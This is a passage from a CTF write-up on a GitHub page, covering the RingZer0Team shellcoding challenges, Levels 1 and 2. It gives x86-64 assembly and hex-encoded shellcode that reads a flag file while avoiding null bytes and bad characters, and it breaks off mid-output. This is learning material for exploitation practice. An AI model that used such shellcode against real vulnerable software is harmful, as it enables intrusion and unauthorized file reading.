      <svg class="octicon octicon-git-pull-request" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11 11.28V5c-.03-.78-.34-1.47-.94-2.06C9.46 2.35 8.78 2.03 8 2H7V0L4 3l3 3V4h1c.27.02.48.11.69.31.21.2.3.42.31.69v6.28A1.993 1.993 0 0 0 10 15a1.993 1.993 0 0 0 1-3.72zm-1 2.92c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zM4 3c0-1.11-.89-2-2-2a1.993 1.993 0 0 0-1 3.72v6.56A1.993 1.993 0 0 0 2 15a1.993 1.993 0 0 0 1-3.72V4.72c.59-.34 1-.98 1-1.72zm-.8 10c0 .66-.55 1.2-1.2 1.2-.65 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"></path></svg>
      <span itemprop="name">Pull requests</span>
      <span class="Counter">0</span>
      <meta itemprop="position" content="3">
</a>  </span>


    <a data-hotkey="g b" class="js-selected-navigation-item reponav-item" data-selected-links="repo_projects new_repo_project repo_project /VulnHub/ctf-writeups/projects" href="https://github.com/VulnHub/ctf-writeups/projects">
      <svg class="octicon octicon-project" viewBox="0 0 15 16" version="1.1" width="15" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      Projects
      <span class="Counter">0</span>
</a>

    <a class="js-selected-navigation-item reponav-item" data-hotkey="g w" data-selected-links="repo_wiki /VulnHub/ctf-writeups/wiki" href="https://github.com/VulnHub/ctf-writeups/wiki">
      <svg class="octicon octicon-book" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3 5h4v1H3V5zm0 3h4V7H3v1zm0 2h4V9H3v1zm11-5h-4v1h4V5zm0 2h-4v1h4V7zm0 2h-4v1h4V9zm2-6v9c0 .55-.45 1-1 1H9.5l-1 1-1-1H2c-.55 0-1-.45-1-1V3c0-.55.45-1 1-1h5.5l1 1 1-1H15c.55 0 1 .45 1 1zm-8 .5L7.5 3H2v9h6V3.5zm7-.5H9.5l-.5.5V12h6V3z"></path></svg>
      Wiki
</a>
    <a data-skip-pjax="true" class="js-selected-navigation-item reponav-item" data-selected-links="security alerts policy /VulnHub/ctf-writeups/security/advisories" href="https://github.com/VulnHub/ctf-writeups/security/advisories">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" class="octicon" height="16px" width="16px">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M1 2l7-2 7 2v6.02C15 12.69 9.69 16 8 16c-1.69 0-7-3.31-7-7.98V2zm1 .75L8 1l6 1.75v5.268C14 12.104 9.45 15 8 15c-1.45 0-6-2.896-6-6.982V2.75z"></path>
    <path d="M3 3.5L8 2v12c-1.207 0-5-2.482-5-5.985V3.5z"></path>
</svg>

      Security
</a>
    <a class="js-selected-navigation-item reponav-item" data-selected-links="repo_graphs repo_contributors dependency_graph pulse people /VulnHub/ctf-writeups/pulse" href="https://github.com/VulnHub/ctf-writeups/pulse">
      <svg class="octicon octicon-graph" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M16 14v1H0V0h1v14h15zM5 13H3V8h2v5zm4 0H7V3h2v10zm4 0h-2V6h2v7z"></path></svg>
      Insights
</a>

</nav>

  <div class="reponav-wrapper reponav-small d-lg-none">
  <nav class="reponav js-reponav text-center no-wrap" itemscope="" itemtype="http://schema.org/BreadcrumbList">

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a class="js-selected-navigation-item selected reponav-item" itemprop="url" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages /VulnHub/ctf-writeups" href="https://github.com/VulnHub/ctf-writeups">
        <span itemprop="name">Code</span>
        <meta itemprop="position" content="1">
</a>    </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /VulnHub/ctf-writeups/issues" href="https://github.com/VulnHub/ctf-writeups/issues">
          <span itemprop="name">Issues</span>
          <span class="Counter">1</span>
          <meta itemprop="position" content="2">
</a>      </span>

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls checks /VulnHub/ctf-writeups/pulls" href="https://github.com/VulnHub/ctf-writeups/pulls">
        <span itemprop="name">Pull requests</span>
        <span class="Counter">0</span>
        <meta itemprop="position" content="3">
</a>    </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_projects new_repo_project repo_project /VulnHub/ctf-writeups/projects" href="https://github.com/VulnHub/ctf-writeups/projects">
          <span itemprop="name">Projects</span>
          <span class="Counter">0</span>
          <meta itemprop="position" content="4">
</a>      </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_wiki /VulnHub/ctf-writeups/wiki" href="https://github.com/VulnHub/ctf-writeups/wiki">
          <span itemprop="name">Wiki</span>
          <meta itemprop="position" content="5">
</a>      </span>

      <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="security alerts policy /VulnHub/ctf-writeups/security/advisories" href="https://github.com/VulnHub/ctf-writeups/security/advisories">
        <span itemprop="name">Security</span>
        <meta itemprop="position" content="6">
</a>
      <a class="js-selected-navigation-item reponav-item" data-selected-links="pulse /VulnHub/ctf-writeups/pulse" href="https://github.com/VulnHub/ctf-writeups/pulse">
        Pulse
</a>
      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="community /VulnHub/ctf-writeups/community" href="https://github.com/VulnHub/ctf-writeups/community">
          Community
</a>      </span>

  </nav>
</div>


  </div>
<div class="container-lg new-discussion-timeline experiment-repo-nav  p-responsive">
  <div class="repository-content ">

    
    


  
    <a class="d-none js-permalink-shortcut" data-hotkey="y" href="https://github.com/VulnHub/ctf-writeups/blob/d0e1fe3aa9a00df9cac84307c9d384120775ba48/2015/ringzer0/shellcoding.md">Permalink</a>

    <!-- blob contrib key: blob_contributors:v21:7996058c65e92efb776bd172415b4de1 -->
      

    <div class="d-flex flex-items-start flex-shrink-0 mb-2 flex-column flex-md-row">
      <span class="d-flex flex-justify-between width-full width-md-auto">
        
<details class="details-reset details-overlay select-menu branch-select-menu hx_rsm" id="branch-select-menu">
  <summary class="btn btn-sm select-menu-button css-truncate" data-hotkey="w" title="Switch branches or tags" aria-haspopup="menu">
    <i>Branch:</i>
    <span class="css-truncate-target">master</span>
  </summary>

  <details-menu class="select-menu-modal hx_rsm-modal position-absolute" style="z-index: 99;" src="/VulnHub/ctf-writeups/ref-list/master/2015/ringzer0/shellcoding.md?source_action=show&amp;source_controller=blob" preload="" role="menu">
    
<div class="select-menu-header">
  <span class="select-menu-title">Switch branches/tags</span>
  <button class="hx_rsm-close-button d-none btn-link close-button" type="button" data-toggle-for="branch-select-menu"><svg aria-label="Close menu" class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" role="img"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg></button>
</div>

<tab-container>
  <div class="select-menu-filters">
    <div class="select-menu-text-filter">
      <input type="text" id="context-commitish-filter-field" class="form-control js-filterable-field" autofocus="" aria-label="Filter branches/tags" placeholder="Filter branches/tags">
    </div>
    <div class="select-menu-tabs" role="tablist">
      <ul>
        <li class="select-menu-tab">
          <button type="button" class="select-menu-tab-nav" data-filter-placeholder="Filter branches/tags" role="tab" aria-selected="true">Branches</button>
        </li>
        <li class="select-menu-tab">
          <button type="button" class="select-menu-tab-nav" data-filter-placeholder="Find a tag…" role="tab">Tags</button>
        </li>
      </ul>
    </div>
  </div>
  
  <div class="select-menu-list" role="tabpanel">
    <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">
        <a class="select-menu-item" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" role="menuitemradio" aria-checked="true" rel="nofollow">
          <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
          <span class="select-menu-item-text css-truncate-target js-select-menu-filter-text">
            master
          </span>
        </a>
    </div>
  
      <div class="select-menu-no-results">Nothing to show</div>
  </div>
  
  <div class="select-menu-list filterable-empty" role="tabpanel" hidden="">
    <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring" class="filterable-empty">
    </div>
  
    <div class="select-menu-no-results">Nothing to show</div>
  </div>
</tab-container>

  <div class="sr-only" data-filterable-notice="" aria-live="polite">0 results found.</div></details-menu>
</details>

        <div class="BtnGroup flex-shrink-0 d-md-none">
          <a href="https://github.com/VulnHub/ctf-writeups/find/master" class="js-pjax-capture-input btn btn-sm BtnGroup-item" data-pjax="" data-hotkey="t">
            Find file
          </a>
          <clipboard-copy value="2015/ringzer0/shellcoding.md" class="btn btn-sm BtnGroup-item" tabindex="0" role="button">
            Copy path
          </clipboard-copy>
        </div>
      </span>
      <h2 id="blob-path" class="breadcrumb flex-auto min-width-0 text-normal flex-md-self-center ml-md-2 mr-md-3 my-2 my-md-0">
        <span class="js-repo-root text-bold"><span class="js-path-segment"><a data-pjax="true" href="https://github.com/VulnHub/ctf-writeups"><span>ctf-writeups</span></a></span></span><span class="separator">/</span><span class="js-path-segment"><a data-pjax="true" href="https://github.com/VulnHub/ctf-writeups/tree/master/2015"><span>2015</span></a></span><span class="separator">/</span><span class="js-path-segment"><a data-pjax="true" href="https://github.com/VulnHub/ctf-writeups/tree/master/2015/ringzer0"><span>ringzer0</span></a></span><span class="separator">/</span><strong class="final-path">shellcoding.md</strong>
      </h2>

      <div class="BtnGroup flex-shrink-0 d-none d-md-inline-block">
        <a href="https://github.com/VulnHub/ctf-writeups/find/master" class="js-pjax-capture-input btn btn-sm BtnGroup-item" data-pjax="" data-hotkey="t">
          Find file
        </a>
        <clipboard-copy value="2015/ringzer0/shellcoding.md" class="btn btn-sm BtnGroup-item" tabindex="0" role="button">
          Copy path
        </clipboard-copy>
      </div>
    </div>



    
  <div class="Box Box--condensed d-flex flex-column flex-shrink-0">
      <div class="Box-body d-flex flex-justify-between bg-blue-light flex-column flex-md-row flex-items-start flex-md-items-center">
        <span class="pr-md-4 f6">
          <a rel="contributor" data-skip-pjax="true" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=7305327" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/superkojiman"><img class="avatar" src="./shellcode_files/7305327" width="20" height="20" alt="@superkojiman"></a>
          <a class="text-bold link-gray-dark lh-default v-align-middle" rel="contributor" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=7305327" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/superkojiman">superkojiman</a>
            <span class="lh-default v-align-middle">
              <a data-pjax="true" title="Change extension to .md" class="link-gray" href="https://github.com/VulnHub/ctf-writeups/commit/6fb5ce13bf4691f21d5e3ac3ff68f147d991fc7d">Change extension to .md</a>
            </span>
        </span>
        <span class="d-inline-block flex-shrink-0 v-align-bottom f6 mt-2 mt-md-0">
          <a class="pr-2 text-mono link-gray" href="https://github.com/VulnHub/ctf-writeups/commit/6fb5ce13bf4691f21d5e3ac3ff68f147d991fc7d" data-pjax="">6fb5ce1</a>
          <relative-time datetime="2016-02-09T04:06:21Z" title="Feb 8, 2016, 11:06 PM EST">on Feb 8, 2016</relative-time>
        </span>
      </div>

    <div class="Box-body d-flex flex-items-center flex-auto f6 border-bottom-0 flex-wrap">
      <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark float-left mr-2" id="blob_contributors_box">
        <summary class="btn-link" aria-haspopup="dialog" role="button">
          <span><strong>1</strong> contributor</span>
        </summary>
        <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast" aria-label="Users who have contributed to this file" src="/VulnHub/ctf-writeups/contributors/master/2015/ringzer0/shellcoding.md/list" preload="" role="dialog" aria-modal="true">
          <div class="Box-header">
            <button class="Box-btn-octicon btn-octicon float-right" type="button" aria-label="Close dialog" data-close-dialog="">
              <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
            </button>
            <h3 class="Box-title">
              Users who have contributed to this file
            </h3>
          </div>
          <include-fragment class="octocat-spinner my-3" aria-label="Loading..."></include-fragment>
        </details-dialog>
      </details>
    </div>
  </div>





    <div class="Box mt-3 position-relative">
      
<div class="Box-header py-2 d-flex flex-column flex-shrink-0 flex-md-row flex-md-items-center">

  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
      1127 lines (861 sloc)
      <span class="file-info-divider"></span>
    39.2 KB
  </div>

  <div class="d-flex py-1 py-md-0 flex-auto flex-order-1 flex-md-order-2 flex-sm-grow-0 flex-justify-between">

    <div class="BtnGroup">
      <a id="raw-url" class="btn btn-sm BtnGroup-item" href="https://github.com/VulnHub/ctf-writeups/raw/master/2015/ringzer0/shellcoding.md">Raw</a>
        <a class="btn btn-sm js-update-url-with-hash BtnGroup-item" data-hotkey="b" href="https://github.com/VulnHub/ctf-writeups/blame/master/2015/ringzer0/shellcoding.md">Blame</a>
      <a rel="nofollow" class="btn btn-sm BtnGroup-item" href="https://github.com/VulnHub/ctf-writeups/commits/master/2015/ringzer0/shellcoding.md">History</a>
    </div>


    <div>

            <!-- '"` --><!-- </textarea></xmp> --><form class="inline-form js-update-url-with-hash" action="https://github.com/VulnHub/ctf-writeups/edit/master/2015/ringzer0/shellcoding.md" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="QR2kZOih+OeHP+FAqJJutoxV9BOdc0j59erwjQVrOVS7HadUaIqNNCmzA9z206u6juaagOh+/4CVrvT67ru2GA==">
              <button class="btn-octicon tooltipped tooltipped-nw" type="submit" aria-label="Fork this project and edit the file" data-hotkey="e" data-disable-with="">
                <svg class="octicon octicon-pencil" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M0 12v3h3l8-8-3-3-8 8zm3 2H1v-2h1v1h1v1zm10.3-9.3L12 6 9 3l1.3-1.3a.996.996 0 0 1 1.41 0l1.59 1.59c.39.39.39 1.02 0 1.41z"></path></svg>
              </button>
</form>
          <!-- '"` --><!-- </textarea></xmp> --><form class="inline-form" action="https://github.com/VulnHub/ctf-writeups/delete/master/2015/ringzer0/shellcoding.md" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="w4eSqLa82irQvCSVg0qwVFKYyhPqXjTvHTyHq5TXIvJwbemyATeSlwYCXw2ffZqtJ/kwiuL6/oPIUD1wTRZYMw==">
            <button class="btn-octicon btn-octicon-danger tooltipped tooltipped-nw" type="submit" aria-label="Fork this project and delete the file" data-disable-with="">
              <svg class="octicon octicon-trashcan" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11 2H9c0-.55-.45-1-1-1H5c-.55 0-1 .45-1 1H2c-.55 0-1 .45-1 1v1c0 .55.45 1 1 1v9c0 .55.45 1 1 1h7c.55 0 1-.45 1-1V5c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm-1 12H3V5h1v8h1V5h1v8h1V5h1v8h1V5h1v9zm1-10H2V3h9v1z"></path></svg>
            </button>
</form>    </div>
  </div>
</div>




      
  <div id="readme" class="Box-body readme blob instapaper_body js-code-block-container">
    <article class="markdown-body entry-content p-3 p-md-6" itemprop="text"><h3><a id="user-content-solved-by-barrebas" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#solved-by-barrebas"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Solved by barrebas</h3>
<p><a href="http://ringzer0team.com/" rel="nofollow">RingZer0Team</a> is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun <strong>and</strong> I learned a ton about 64-bit shellcoding while solving them!</p>
<p>I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)</p>
<h2><a id="user-content-level-1" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 1</h2>
<p>Let's start easy. Upon connecting via <code>ssh</code>, the challenge presents us with the following:</p>
<pre><code>$ ssh level1@shellcode.ringzer0team.com -p 7771
level1@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37

RingZer0 Team CTF Shellcoding Level 1
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have no shellcode restriction.
You main goal is to read /flag/level1.flag

shellcode&gt;
</code></pre>
<p>Although it says <em>no restriction</em>, there is one crucial restriction: NULL bytes are <strong>not</strong> allowed. This probably means that the shellcode is being copied to a buffer by <code>strcpy</code> or something similar. I found this out the hard way... Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64" rel="nofollow">x64 syscall table</a> which lists all the syscalls and the arguments.</p>
<p>To avoid NULL bytes, registers can be zeroed by using <code>xor</code>. To set a byte-sized value, the value can be <code>push</code>ed and then <code>pop</code>ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.</p>
<pre><code>bits 64

_start:

mov dword [rsp], '/fla'     ; build filename on stack
mov dword [rsp+4], 'g/le'
mov dword [rsp+8], 'vel1'
mov dword [rsp+12], '.fla'
push 'g'
pop rcx
mov [rsp+16], ecx

lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
xor rax, rax
inc rax
inc rax                     ; syscall open = 2
syscall 

mov rbx, rax                ; filehandle of opened file

lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
mov rdi, rbx                ; rbx was the filehandle
push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
pop rdx
xor rax, rax                ; syscall read = 0
syscall

lea rsi, [rsp]              ; the contents of the file were on the stack
xor rdi, rdi
inc rdi                     ; filehandle; stdout!
mov rdx, rax                ; rax was amount of bytes read by syscall read
xor rax, rax
inc rax
syscall                     ; syscall write = 1

push byte 60                ; some bytes left...
pop rax                     ; exit cleanly
syscall

</code></pre>
<p>To assemble and generate the shellcode in the format which the challenge wants, I used this command:</p>
<div class="highlight highlight-source-shell"><pre>$ <span class="pl-c1">echo</span><span class="pl-k">;</span> nasm -f bin ./level1-nonulls.asm<span class="pl-k">;</span> xxd -c 1 ./level1-nonulls <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print "\\x"$2 }<span class="pl-pds">'</span></span> <span class="pl-k">|</span>tr -d <span class="pl-s"><span class="pl-pds">'</span>\n<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> wc -c ./level1-nonulls

<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>04<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>2f<span class="pl-cce">\x</span>66<span class="pl-cce">\x</span>6c<span class="pl-cce">\x</span>61<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>44<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>04<span class="pl-cce">\x</span>67<span class="pl-cce">\x</span>2f<span class="pl-cce">\x</span>6c<span class="pl-cce">\x</span>65<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>44<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>08<span class="pl-cce">\x</span>76<span class="pl-cce">\x</span>65<span class="pl-cce">\x</span>6c<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>44<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>0c<span class="pl-cce">\x</span>2e<span class="pl-cce">\x</span>66<span class="pl-cce">\x</span>6c<span class="pl-cce">\x</span>61<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>67<span class="pl-cce">\x</span>59<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>4c<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>10<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>8d<span class="pl-cce">\x</span>3c<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>f6<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>c3<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>8d<span class="pl-cce">\x</span>34<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>df<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>7f<span class="pl-cce">\x</span>5a<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>8d<span class="pl-cce">\x</span>34<span class="pl-cce">\x</span>24<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c7<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>c2<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>3c<span class="pl-cce">\x</span>58<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05
100 ./level1-nonulls</pre></div>
<p>It spits out the shellcode, ready for copy &amp; paste, along with the size of the shellcode. Running it versus the server yields the flag!</p>
<h2><a id="user-content-level-2" class="anchor" aria-hidden="true" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#level-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Level 2</h2>
<p>The password for level 2 is the flag of level 1. It seems the ante has been upped:</p>
<pre><code>RingZer0 Team CTF Shellcoding Level 2
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x99" max size 50 bytes.
You main goal is to read /flag/level2.flag
</code></pre>
<p>So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called <em>bad chars</em>. This will restrict the instructions we can use in the shellcode. Let's have a look at how we can trim the fat off of the shellcode of level 1.</p>
<p>First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char <code>0x2f</code> which is the slash <code>/</code>. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.</p>
<pre><code>bits 64

_start:
xor rax, rax        ; syscall read = 0
xor rdi, rdi        ; we'll read from stdin
mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
push byte 18        ; number of bytes to read, enough for the filename
pop rdx
syscall 

xor rax, rax
inc rax
inc rax             ; syscall open
                    ; instead of setting rdi to the filename (located on the stack),
                    ; we re-use the fact that rdi is zero and rsi points to that filename
xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
syscall

xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
push byte 127
pop rdx             ; read 127 bytes, should be plenty
syscall             ; because we set rax to 0, this will call syscall read

xor rax, rax
inc rax             ; syscall write
mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; grab the flag!
</code></pre>
<p>Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!</p>
<pre><code>$ echo; nasm -f bin ./level2-shellcode.asm; xxd -c 1 ./level2-shellcode | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level2-shellcode

\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
49 ./level2-shellcode
</code></pre>
<p>Running it on the server:</p>
<div class="highlight highlight-source-shell"><pre>shellcode<span class="pl-k">&gt;</span><span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>89<span class="pl-cce">\x</span>e6<span class="pl-cce">\x</span>6a<span class="pl-cce">\x</span>12<span class="pl-cce">\x</span>5a<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>31<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>ff<span class="pl-cce">\x</span>c0<span class="pl-cce">\x</span>48<span class="pl-cce">\x</span>87<span class="pl-cce">\x</span>f7<span class="pl-cce">\x</span>0f<span class="pl-cce">\x</span>05<span 